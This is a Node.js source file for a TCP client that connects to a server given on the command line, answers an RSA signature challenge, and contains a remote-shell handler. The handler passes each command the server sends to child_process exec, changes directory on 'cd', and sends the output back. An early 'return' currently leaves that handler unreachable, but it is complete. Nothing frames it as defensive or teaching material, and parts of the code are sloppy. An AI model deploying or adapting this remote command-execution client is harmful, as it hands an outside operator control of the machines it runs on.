const { Socket } = require("net");
const { exec } = require("child_process");
const { EventEmitter } = require("stream");
const { register, connect } = require("./setup");
const socket = new Socket();
const crypto = require("crypto");
const { getPublicKey } = require("./helpers");

// take port and host from command line arguments
const port = parseInt(process.argv[2]) || 3000;
const host = process.argv[3] || "localhost";

socket.connect(port, host, () => {
  console.log("Connected to server");
  register(socket);

  setTimeout(() => {
    connect(socket);
  }, 3000);
});

socket.on("data", (data) => {
  console.log("Received:", data.toString(), typeof data);
  let command = data;
  if (command === "exit") {
    socket.end();
    process.exit();
  }

  try {
    command = JSON.parse(command);
    if (command && command?.type === "send_challenge") {
      console.log("Challenge received");
      const challenge = command.data.challenge;
      let encryptedChallenge = Buffer.from(challenge, "hex");
      console.log("Encrypted challenge:", encryptedChallenge);
      console.log("Challenge:", challenge);

      let key = getPublicKey();
      console.log("Public key:", key)
      const isVerified = crypto.verify(
        "sha256",
        Buffer.from(challenge),
        {
          key: key,
          padding: crypto.constants.RSA_PKCS1_PSS_PADDING,
        },
        encryptedChallenge,
      );

      console.log("Is verified:", isVerified);
      // Respond to challenge
      socket.write(
        JSON.stringify({
          type: "respond_challenge",
          data: {
            response: isVerified,
          },
        }),
      );
    }
  } catch (error) {
    console.log("Error parsing JSON", error);
  }

  return;

  let currentDirectory = process.cwd();
  if (command.startsWith("cd")) {
    console.log("Changing directory");

    const targetDirectory = command.slice(3).trim(); // Extract target directory
    process.chdir(targetDirectory); // Change directory locally
    currentDirectory = process.cwd(); // Update current directory
    socket.write(currentDirectory); // Send current directory back to the server
  } else {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.log(`error: ${error.message}`);
        socket.write(error.message);
        return;
      }
      if (stderr) {
        console.log(`stderr: ${stderr}`);
        socket.write(stderr);
        return;
      }
      //console.log(`stdout: ${stdout}`);
      socket.write(stdout);
    });
  }
});
